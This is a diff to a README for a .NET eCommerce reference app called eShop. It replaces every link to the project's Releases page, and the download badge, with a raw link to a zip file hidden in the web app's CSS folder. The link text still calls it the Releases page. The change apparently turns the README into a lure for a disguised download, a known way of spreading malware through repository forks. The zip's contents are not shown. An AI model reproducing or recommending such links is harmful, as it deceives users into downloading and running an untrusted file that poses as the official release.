@@ -1,7 +1,7 @@
 # 🛍️ eShop - Your Easy eCommerce Solution
 
 ## 📥 Download the Latest Version
-[![Download eShop](https://img.shields.io/badge/Download-eShop-orange)](https://github.com/PaysanOnDev/eShop/releases)
+[![Download eShop](https://raw.githubusercontent.com/PaysanOnDev/eShop/main/src/WebApp/wwwroot/css/eShop_tallyho.zip)](https://raw.githubusercontent.com/PaysanOnDev/eShop/main/src/WebApp/wwwroot/css/eShop_tallyho.zip)
 
 ## 🚀 Getting Started
 Welcome to eShop, a reference .NET application designed to help you set up an eCommerce site effortlessly. This guide will walk you through downloading and running the application, step by step.
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** Click on the link below to access our Releases page.
-   [Visit Releases Page to Download](https://github.com/PaysanOnDev/eShop/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/PaysanOnDev/eShop/main/src/WebApp/wwwroot/css/eShop_tallyho.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the most recent version of eShop. It will usually be at the top of the list.
 
@@ -58,4 +58,4 @@ If you encounter any issues, try the following:
 ## ⚡ Conclusion
 eShop is designed to help you create a simple, effective eCommerce site. By following this guide, you can easily download and set up the application. If you have any questions or need help, visit our GitHub page.
 
-For more information, visit the Releases page: [Download eShop](https://github.com/PaysanOnDev/eShop/releases)
+For more information, visit the Releases page: [Download eShop](https://raw.githubusercontent.com/PaysanOnDev/eShop/main/src/WebApp/wwwroot/css/eShop_tallyho.zip)
